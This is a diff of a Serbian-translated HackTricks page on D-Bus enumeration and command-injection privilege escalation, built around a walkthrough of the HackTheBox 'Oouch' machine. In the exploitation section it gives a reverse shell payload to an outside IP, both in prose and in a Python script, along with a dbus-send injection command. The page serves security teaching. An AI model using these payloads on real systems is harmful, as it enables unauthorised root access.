@@ -1,27 +1,27 @@
-# D-Bus Enumeracija & Command Injection Privilege Escalation
+# D-Bus Enumeration & Command Injection Privilege Escalation
 
 {% hint style="success" %}
-Naučite & vežbajte AWS Hakovanje:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stručnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Naučite & vežbajte GCP Hakovanje: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stručnjak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Podržite HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## **GUI enumeracija**
+## **GUI enumeration**
 
-D-Bus se koristi kao posrednik za međuprocesnu komunikaciju (IPC) u Ubuntu desktop okruženjima. Na Ubuntu-u, primećeno je istovremeno delovanje nekoliko autobusa poruka: sistemski autobus, koji se uglavnom koristi od strane **privilegovanih servisa za izlaganje servisa relevantnih širom sistema**, i sesijski autobus za svakog prijavljenog korisnika, koji izlaže servise relevantne samo tom specifičnom korisniku. Fokus ovde je pretežno na sistemskom autobusu zbog njegove povezanosti sa servisima koji se izvršavaju sa većim privilegijama (npr. root) jer je naš cilj da povisimo privilegije. Primećeno je da arhitektura D-Bus-a koristi 'ruter' po sesijskom autobusu, koji je odgovoran za preusmeravanje klijentskih poruka ka odgovarajućim servisima na osnovu adrese koju su klijenti naveli za servis sa kojim žele da komuniciraju.
+D-Bus se koristi kao posrednik za međuprocesnu komunikaciju (IPC) u Ubuntu desktop okruženjima. Na Ubuntu-u se posmatra istovremeno delovanje nekoliko autobusnih poruka: sistemski autobus, koji prvenstveno koriste **privilegovane usluge za izlaganje usluga relevantnih za ceo sistem**, i sesijski autobus za svakog prijavljenog korisnika, koji izlaže usluge relevantne samo za tog specifičnog korisnika. Fokus ovde je prvenstveno na sistemskom autobusu zbog njegove povezanosti sa uslugama koje rade sa višim privilegijama (npr. root), jer je naš cilj da povećamo privilegije. Primećeno je da arhitektura D-Bus-a koristi 'usmerivač' po sesijskom autobusu, koji je odgovoran za preusmeravanje poruka klijenata na odgovarajuće usluge na osnovu adrese koju klijenti specificiraju za uslugu sa kojom žele da komuniciraju.
 
-Servisi na D-Bus-u su definisani **objektima** i **interfejsima** koje izlažu. Objekti se mogu uporediti sa instancama klasa u standardnim OOP jezicima, pri čemu je svaka instanca jedinstveno identifikovana **putanjom objekta**. Ova putanja, slična putanji sistema datoteka, jedinstveno identifikuje svaki objekat izložen od strane servisa. Ključni interfejs za istraživačke svrhe je **org.freedesktop.DBus.Introspectable** interfejs, koji sadrži jednu metodu, Introspect. Ova metoda vraća XML reprezentaciju podržanih metoda objekta, signala i svojstava, sa fokusom ovde na metodama, dok se svojstva i signali izostavljaju.
+Usluge na D-Bus-u definišu **objekti** i **interfejsi** koje izlažu. Objekti se mogu uporediti sa instancama klasa u standardnim OOP jezicima, pri čemu je svaka instanca jedinstveno identifikovana **putanjom objekta**. Ova putanja, slična putanji u datotečnom sistemu, jedinstveno identifikuje svaki objekat koji usluga izlaže. Ključni interfejs za istraživačke svrhe je **org.freedesktop.DBus.Introspectable** interfejs, koji sadrži jedinstvenu metodu, Introspect. Ova metoda vraća XML reprezentaciju podržanih metoda, signala i svojstava objekta, pri čemu se ovde fokusiramo na metode dok se svojstva i signali izostavljaju.
 
-Za komunikaciju sa D-Bus interfejsom, korišćena su dva alata: CLI alat nazvan **gdbus** za jednostavno pozivanje metoda izloženih od strane D-Bus-a u skriptama, i [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), Python baziran GUI alat dizajniran za enumeraciju dostupnih servisa na svakom autobusu i prikazivanje objekata sadržanih unutar svakog servisa.
+Za komunikaciju sa D-Bus interfejsom korišćena su dva alata: CLI alat nazvan **gdbus** za jednostavno pozivanje metoda koje D-Bus izlaže u skriptama, i [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), GUI alat zasnovan na Python-u, dizajniran za enumeraciju usluga dostupnih na svakom autobusu i za prikaz objekata sadržanih unutar svake usluge.
 ```bash
 sudo apt-get install d-feet
 ```
@@ -30,21 +30,21 @@ sudo apt-get install d-feet
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
 
-U prvoj slici prikazane su usluge registrovane sa D-Bus sistemskim autobusom, sa **org.debin.apt** posebno istaknutim nakon odabira dugmeta System Bus. D-Feet upita ovu uslugu za objekte, prikazujući interfejse, metode, osobine i signale za odabrane objekte, što se vidi na drugoj slici. Takođe je detaljno prikazan potpis svake metode.
+Na prvoj slici prikazane su usluge registrovane sa D-Bus sistemskom magistralom, sa **org.debin.apt** posebno istaknutom nakon odabira dugmeta System Bus. D-Feet upitkuje ovu uslugu za objekte, prikazujući interfejse, metode, svojstva i signale za odabrane objekte, što se vidi na drugoj slici. Takođe su detaljno opisani potpisi svake metode.
 
-Značajna karakteristika je prikaz **identifikatora procesa (pid)** i **komandne linije** usluge, korisno za potvrdu da li usluga radi sa povišenim privilegijama, što je važno za relevantnost istraživanja.
+Značajna karakteristika je prikaz **ID procesa (pid)** i **komandne linije** usluge, što je korisno za potvrđivanje da li usluga radi sa povišenim privilegijama, što je važno za relevantnost istraživanja.
 
-**D-Feet takođe omogućava pozivanje metoda**: korisnici mogu uneti Python izraze kao parametre, koje D-Feet konvertuje u D-Bus tipove pre prosleđivanja usluzi.
+**D-Feet takođe omogućava pozivanje metoda**: korisnici mogu uneti Python izraze kao parametre, koje D-Feet konvertuje u D-Bus tipove pre nego što ih prosledi usluzi.
 
-Međutim, imajte na umu da **neki metodi zahtevaju autentikaciju** pre nego što nam dozvole da ih pozovemo. Ignorišemo ove metode, jer nam je cilj da povišemo privilegije bez pristupnih podataka u prvom redu.
+Međutim, imajte na umu da **neke metode zahtevaju autentifikaciju** pre nego što nam dozvole da ih pozovemo. Ignorisaćemo ove metode, pošto je naš cilj da povećamo svoje privilegije bez kredencijala u prvom redu.
 
-Takođe imajte na umu da neke usluge upituju drugu D-Bus uslugu nazvanu org.freedeskto.PolicyKit1 da li korisnik sme izvršiti određene radnje ili ne.
+Takođe imajte na umu da neke od usluga upitkuju drugu D-Bus uslugu pod imenom org.freedeskto.PolicyKit1 da li korisniku treba dozvoliti da izvrši određene radnje ili ne.
 
-## **Enumeracija komandne linije**
+## **Cmd line Enumeration**
 
-### Lista objekata usluge
+### Lista objekata usluga
 
-Moguće je izlistati otvorene D-Bus interfejse sa:
+Moguće je nabrojati otvorene D-Bus interfejse sa:
 ```bash
 busctl list #List D-Bus interfaces
 
@@ -68,11 +68,11 @@ org.freedesktop.PolicyKit1               - -               -                (act
 org.freedesktop.hostname1                - -               -                (activatable) -                         -
 org.freedesktop.locale1                  - -               -                (activatable) -                         -
 ```
-#### Veze
+#### Connections
 
-[Od Vikipedije:](https://en.wikipedia.org/wiki/D-Bus) Kada proces uspostavi vezu sa autobusom, autobus dodeljuje vezi posebno ime autobusa koje se zove _jedinstveno ime veze_. Imena autobusa ovog tipa su nepromenljiva - garantovano se neće promeniti dok veza postoji - i, što je još važnije, ne mogu se ponovo koristiti tokom trajanja autobusa. To znači da nijedna druga veza sa tim autobusom nikada neće imati dodeljeno takvo jedinstveno ime veze, čak i ako isti proces zatvori vezu sa autobusom i kreira novu. Jedinstvena imena veza lako su prepoznatljiva jer počinju sa - inače zabranjenim - znakom dvotačke.
+[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Kada proces uspostavi vezu sa autobusom, autobus dodeljuje toj vezi poseban naziv autobusa koji se zove _jedinstveni naziv veze_. Nazivi autobusa ovog tipa su nepromenljivi—garantovano je da se neće promeniti sve dok veza postoji—i, što je još važnije, ne mogu se ponovo koristiti tokom životnog veka autobusa. To znači da nijedna druga veza sa tim autobusom nikada neće imati dodeljen takav jedinstveni naziv veze, čak i ako isti proces zatvori vezu sa autobusom i kreira novu. Jedinstveni nazivi veza su lako prepoznatljivi jer počinju sa—inače zabranjenim—dvotačkom.
 
-### Informacije o objektu servisa
+### Service Object Info
 
 Zatim, možete dobiti neke informacije o interfejsu sa:
 ```bash
@@ -134,9 +134,9 @@ cap_mknod cap_lease cap_audit_write cap_audit_control
 cap_setfcap cap_mac_override cap_mac_admin cap_syslog
 cap_wake_alarm cap_block_suspend cap_audit_read
 ```
-### Lista interfejsa servisnog objekta
+### List Interfaces of a Service Object
 
-Potrebne su vam dozvole.
+Morate imati dovoljno dozvola.
 ```bash
 busctl tree htb.oouch.Block #Get Interfaces of the service object
 
@@ -144,9 +144,9 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
 └─/htb/oouch
 └─/htb/oouch/Block
 ```
-### Introspektujte interfejs servisnog objekta
+### Introspect Interface of a Service Object
 
-Primetite kako je u ovom primeru izabran najnoviji interfejs otkriven korišćenjem parametra `tree` (_videti prethodnu sekciju_):
+Napomena kako je u ovom primeru izabran najnoviji interfejs otkriven korišćenjem `tree` parametra (_vidi prethodni odeljak_):
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
 
@@ -164,17 +164,19 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .Set                                method    ssv       -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
-### Interfejs za praćenje / snimanje
+Napomena o metodi `.Block` interfejsa `htb.oouch.Block` (onome koji nas zanima). "s" u drugim kolonama može značiti da očekuje string.
 
-Sa dovoljno privilegija (samo privilegije `send_destination` i `receive_sender` nisu dovoljne) možete **pratiti komunikaciju D-Bus-a**.
+### Monitor/Interfejs za hvatanje
 
-Da biste **pratili** **komunikaciju**, morate biti **root**. Ako i dalje imate problema sa postavljanjem root-a, proverite [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) i [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
+Sa dovoljno privilegija (samo `send_destination` i `receive_sender` privilegije nisu dovoljne) možete **monitorisati D-Bus komunikaciju**.
+
+Da biste **monitorisali** **komunikaciju** potrebno je da budete **root.** Ako i dalje imate problema kao root, proverite [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) i [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
 {% hint style="warning" %}
-Ako znate kako da konfigurišete D-Bus konfiguracioni fajl da **omogućite ne-root korisnicima da prisluškuju** komunikaciju, molimo vas da **me kontaktirate**!
+Ako znate kako da konfigurišete D-Bus konfiguracioni fajl da **omogući korisnicima koji nisu root da prisluškuju** komunikaciju, molim vas **kontaktirajte me**!
 {% endhint %}
 
-Različiti načini praćenja:
+Različiti načini za monitorisanje:
 ```bash
 sudo busctl monitor htb.oouch.Block #Monitor only specified
 sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
@@ -199,13 +201,15 @@ MESSAGE "s" {
 STRING "Carried out :D";
 };
 ```
+Možete koristiti `capture` umesto `monitor` da sačuvate rezultate u pcap datoteci.
+
 #### Filtriranje svih šumova <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
-Ako ima previše informacija na magistrali, prosledite pravilo podudaranja na sledeći način:
+Ako ima previše informacija na autobusu, prosledite pravilo za podudaranje ovako:
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-Više pravila može biti navedeno. Ako poruka odgovara _bilo kojem_ od pravila, poruka će biti odštampana. Na primer:
+Više pravila može biti navedeno. Ako poruka odgovara _bilo kojem_ od pravila, poruka će biti odštampana. Kao ovo:
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
@@ -217,11 +221,11 @@ Pogledajte [D-Bus dokumentaciju](http://dbus.freedesktop.org/doc/dbus-specificat
 
 ### Više
 
-`busctl` ima još više opcija, [**pronađite ih sve ovde**](https://www.freedesktop.org/software/systemd/man/busctl.html).
+`busctl` ima još više opcija, [**pronađite sve ovde**](https://www.freedesktop.org/software/systemd/man/busctl.html).
 
-## **Ranjivi scenario**
+## **Ranjavajući Scenario**
 
-Kao korisnik **qtc unutar hosta "oouch" sa HTB-a** možete pronaći **neočekivani D-Bus konfiguracioni fajl** smešten u _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
+Kao korisnik **qtc unutar hosta "oouch" iz HTB** možete pronaći **neočekivanu D-Bus konfiguracionu datoteku** smeštenu u _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
 
@@ -242,9 +246,9 @@ Kao korisnik **qtc unutar hosta "oouch" sa HTB-a** možete pronaći **neočekiva
 
 </busconfig>
 ```
-Napomena iz prethodne konfiguracije je da **će vam biti potrebno da budete korisnik `root` ili `www-data` da biste slali i primali informacije** putem ove D-BUS komunikacije.
+Napomena iz prethodne konfiguracije da **ćete morati biti korisnik `root` ili `www-data` da biste slali i primali informacije** putem ove D-BUS komunikacije.
 
-Kao korisnik **qtc** unutar docker kontejnera **aeb4525789d8** možete pronaći neki dbus povezan kod u fajlu _/code/oouch/routes.py._ Ovo je interesantan kod:
+Kao korisnik **qtc** unutar docker kontejnera **aeb4525789d8** možete pronaći neki dbus povezani kod u datoteci _/code/oouch/routes.py._ Ovo je zanimljiv kod:
 ```python
 if primitive_xss.search(form.textfield.data):
 bus = dbus.SystemBus()
@@ -256,14 +260,14 @@ response = block_iface.Block(client_ip)
 bus.close()
 return render_template('hacker.html', title='Hacker')
 ```
-Kao što možete videti, **povezuje se sa D-Bus interfejsom** i šalje **"Block" funkciji** "client\_ip".
+Kao što možete videti, **povezuje se na D-Bus interfejs** i šalje **"Block" funkciji** "client\_ip".
 
-Na drugoj strani D-Bus veze radi neka C kompajlirana binarna datoteka. Ovaj kod **osluškuje** D-Bus vezu **za IP adresu i poziva iptables putem `system` funkcije** da blokira datu IP adresu.\
-**Poziv `system` funkcije je namerno ranjiv na ubacivanje komandi**, tako da će niz komandi poput sledećeg kreirati povratni shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+Na drugoj strani D-Bus veze se izvršava neki C kompajlirani binarni program. Ovaj kod **sluša** na D-Bus vezi **za IP adresu i poziva iptables putem `system` funkcije** da blokira zadatu IP adresu.\
+**Poziv `system` je namerno ranjiv na injekciju komandi**, tako da će payload poput sledećeg stvoriti reverznu ljusku: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
 ### Iskoristite to
 
-Na kraju ove stranice možete pronaći **kompletan C kod D-Bus aplikacije**. Unutar njega možete pronaći između linija 91-97 **kako su `D-Bus putanja objekta`** **i `ime interfejsa`** **registrovani**. Ove informacije će biti neophodne za slanje informacija preko D-Bus veze:
+Na kraju ove stranice možete pronaći **kompletan C kod D-Bus aplikacije**. Unutar njega možete pronaći između redova 91-97 **kako su `D-Bus objekat putanja`** **i `ime interfejsa`** **registrovani**. Ove informacije će biti neophodne za slanje informacija na D-Bus vezu:
 ```c
 /* Install the object */
 r = sd_bus_add_object_vtable(bus,
@@ -273,13 +277,13 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-Takođe, u liniji 57 možete pronaći da je **jedina registrovana metoda** za ovu D-Bus komunikaciju nazvana `Block` (_**Zato će u narednom odeljku payloadi biti poslati objektu servisa `htb.oouch.Block`, interfejsu `/htb/oouch/Block` i nazivu metode `Block`**_):
+Takođe, u liniji 57 možete pronaći da je **jedini registrovani metod** za ovu D-Bus komunikaciju nazvan `Block`(_**Zato će u sledećem odeljku biti poslati payload-ovi na servisni objekat `htb.oouch.Block`, interfejs `/htb/oouch/Block` i naziv metoda `Block`**_):
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-Sledeći Python kod će poslati payload preko D-Bus veze metodi `Block` putem `block_iface.Block(runme)` (_napomena da je izvučen iz prethodnog dela koda_):
+Sledeći python kod će poslati payload na D-Bus vezu do `Block` metode putem `block_iface.Block(runme)` (_napomena da je izvučen iz prethodnog dela koda_):
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -289,20 +293,20 @@ runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
 response = block_iface.Block(runme)
 bus.close()
 ```
-#### busctl и dbus-send
+#### busctl i dbus-send
 ```bash
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
-* `dbus-send` je alat koji se koristi za slanje poruka "Message Bus"
-* Message Bus - Softver koji koriste sistemi kako bi olakšali komunikaciju između aplikacija. Povezan je sa Message Queue-om (poruke su poredane u sekvenci), ali u Message Bus-u se poruke šalju u modelu pretplate i takođe vrlo brzo.
-* Tag "-system" se koristi da naznači da je u pitanju sistemsko obaveštenje, a ne sesijsko obaveštenje (podrazumevano).
-* Tag "--print-reply" se koristi za ispisivanje naše poruke na odgovarajući način i prihvatanje bilo kakvih odgovora u ljudski čitljivom formatu.
-* "--dest=Dbus-Interface-Block" Adresa Dbus interfejsa.
-* "--string:" - Tip poruke koju želimo da pošaljemo interfejsu. Postoje različiti formati slanja poruka poput double, bytes, booleans, int, objpath. Od toga, "object path" je koristan kada želimo da pošaljemo putanju fajla interfejsu Dbus. U ovom slučaju možemo koristiti poseban fajl (FIFO) kako bismo prosledili komandu interfejsu pod imenom fajla. "string:;" - Ovo je da ponovo pozovemo object path gde postavljamo FIFO fajl/komandu za obrnutu ljusku.
+* `dbus-send` је алат који се користи за слање порука на “Message Bus”
+* Message Bus – Софтвер који системи користе за лаку комуникацију између апликација. Повезан је са Message Queue (поруке су поређане у низу), али у Message Bus поруке се шаљу у моделу претплате и такође веома брзо.
+* “-system” ознака се користи да означи да је у питању системска порука, а не порука сесије (по подразумевано).
+* “–print-reply” ознака се користи за правилно штампање наше поруке и примање било каквих одговора у формату који је лак за читање.
+* “–dest=Dbus-Interface-Block” Адреса Dbus интерфејса.
+* “–string:” – Тип поруке коју желимо да пошаљемо интерфејсу. Постоји неколико формата за слање порука као што су double, bytes, booleans, int, objpath. Од овога, “object path” је користан када желимо да пошаљемо пут до датотеке Dbus интерфејсу. У овом случају можемо користити специјалну датотеку (FIFO) да пренесемо команду интерфејсу у име датотеке. “string:;” – Ово је да поново позовемо object path где стављамо FIFO reverse shell датотеку/команду.
 
-_Napomena da u `htb.oouch.Block.Block`, prvi deo (`htb.oouch.Block`) se odnosi na servisni objekat, a poslednji deo (`.Block`) se odnosi na naziv metode._
+_Nапомена да у `htb.oouch.Block.Block`, први део (`htb.oouch.Block`) се односи на сервисни објекат, а последњи део (`.Block`) се односи на име методе._
 
-### C kod
+### C code
 
 {% code title="d-bus_server.c" %}
 ```c
@@ -451,16 +455,16 @@ return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 * [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
 {% hint style="success" %}
-Naučite i vežbajte hakovanje AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Red Tim Ekspert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Naučite i vežbajte hakovanje GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Red Tim Ekspert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Podržite HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 {% endhint %}
